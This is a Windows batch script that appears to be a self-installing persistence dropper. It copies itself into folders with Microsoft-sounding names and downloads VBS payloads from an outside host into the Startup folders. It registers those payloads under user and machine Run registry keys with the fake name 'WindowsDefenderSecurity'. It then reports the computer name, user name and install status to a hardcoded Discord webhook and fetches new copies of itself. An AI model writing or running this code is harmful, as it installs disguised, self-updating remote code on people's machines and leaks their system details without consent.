@echo off
setlocal
cls

set "version=2.1"


:: check for admin rights
net session >nul 2>&1
if %errorlevel% == 0 (
    set "AdminRights=true"
) else (
    set "AdminRights=false"
)


:: USER bat file

if exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
    set "userfile=YES"
)
if not exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
    mkdir "%APPDATA%/MicrosoftUpdate/"
    copy /y %~f0 "%AppData%\MicrosoftUpdate\"
    set "userfile=YES"
)


:: PC bat file

if exist "%PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0" (
    set "pcfile=YES"
)
if not exist "%PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0" (
    mkdir "%PROGRAMDATA%/MicrosoftUpdate/"
    copy /y %~f0 "%PROGRAMDATA%\MicrosoftUpdate\"
    set "pcfile=YES"
)


:: USER Autostart

if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
    set "userauto=YES"
)
if not exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
    copy /y "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdate.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.vbs', '%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs')"
    set "userauto=YES"
)


:: PC Autostart

if exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
    set "pcauto=YES"
)
if not exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
    if "%AdminRights%"=="true" (
        copy /y "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdate.vbs" "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
        powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.vbs', '%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs')"
        set "pcauto=YES"
    ) else (
        set "pcauto=NON"
    )

)



:: REGISTRY PART


:: USER registry bat file

if exist "%APPDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
    set "userregistryfile=YES"
)
if not exist "%APPDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
    mkdir "%APPDATA%/MicrosoftDefenderUpdate/"
    copy /y %~f0 "%AppData%\MicrosoftDefenderUpdate\"
    set "userregistryfile=YES"
)


:: PC registry bat file

if exist "%PROGRAMDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
    set "pcregistryfile=YES"
)
if not exist "%PROGRAMDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
    mkdir "%PROGRAMDATA%/MicrosoftDefenderUpdate/"
    copy /y %~f0 "%PROGRAMDATA%\MicrosoftDefenderUpdate\"
    set "pcregistryfile=YES"
)


:: USER registry

if exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
    powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"
    set "userregistryauto=YES"
)
if not exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
    mkdir "%APPDATA%/WindowsDefenderSecurity/"
    copy /y "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%APPDATA%\WindowsDefenderSecurity\"
    powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs', '%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
    powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"
    set "userregistryauto=YES"
)


:: PC registry

if exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
    if "%AdminRights%"=="true" (
        powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
        set "pcregistryauto=YES"
    ) else (
        set "pcregistryauto=NON"
    )
)
if not exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
    if "%AdminRights%"=="true" (
        mkdir "%PROGRAMDATA%/WindowsDefenderSecurity/"
        copy /y "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" "%PROGRAMDATA%\WindowsDefenderSecurity\"
        powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/WindowsDefenderSecurity.vbs', '%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.vbs')"
        powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
        set "pcregistryauto=YES"
    ) else (
        set "pcregistryauto=NON"
    )
)



:: Discord Webhook request

for /f "tokens=2 delims==" %%a in ('wmic OS Get localdatetime /value') do set "dt=%%a"
set "YY=%dt:~2,2%" & set "YYYY=%dt:~0,4%" & set "MM=%dt:~4,2%" & set "DD=%dt:~6,2%"
set "HH=%dt:~8,2%" & set "Min=%dt:~10,2%" & set "Sec=%dt:~12,2%"
set "time=%DD%.%MM%.%YYYY% - %HH%:%Min%:%Sec%"

set "url1=https://discord.com/api/webhooks/"
set "url2=1158045149935440032/nfB686WoABy0Ns6wTIT_z4zkm34DhKgWHIO8zMgP-4FWy21hahTaLPKz8v0gGYYkiQnk"
set "url=%url1%%url2%"

set "content=_setup_%ComputerName%;%USERNAME%;%time%;%version%;%AdminRights%;%userfile%;%pcfile%;%userauto%;%pcauto%;%userregistryfile%;%pcregistryfile%;%userregistryauto%;%pcregistryauto%"

powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $body = @{content='%content%'} | ConvertTo-Json; Invoke-RestMethod -Uri '%url%' -Method POST -ContentType 'application/json' -Body $body"


:: Update all bat files
powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat', '%APPDATA%\MicrosoftUpdate\MicrosoftUpdate.bat')"
powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat', '%PROGRAMDATA%\MicrosoftUpdate\MicrosoftUpdate.bat')"
powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat', '%APPDATA%\MicrosoftDefenderUpdate\MicrosoftUpdate.bat')"
powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat', '%PROGRAMDATA%\MicrosoftDefenderUpdate\MicrosoftUpdate.bat')"


:: delete old files
if exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftUpdate.bat" (
    ::del /f /s /q "%PROGRAMDATA%\MicrosoftDefenderSecurity" (NO PERMISSION)
)
if exist "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftUpdate.bat" (
    del /f /q "%APPDATA%\MicrosoftDefenderSecurity"
)

endlocal
exit
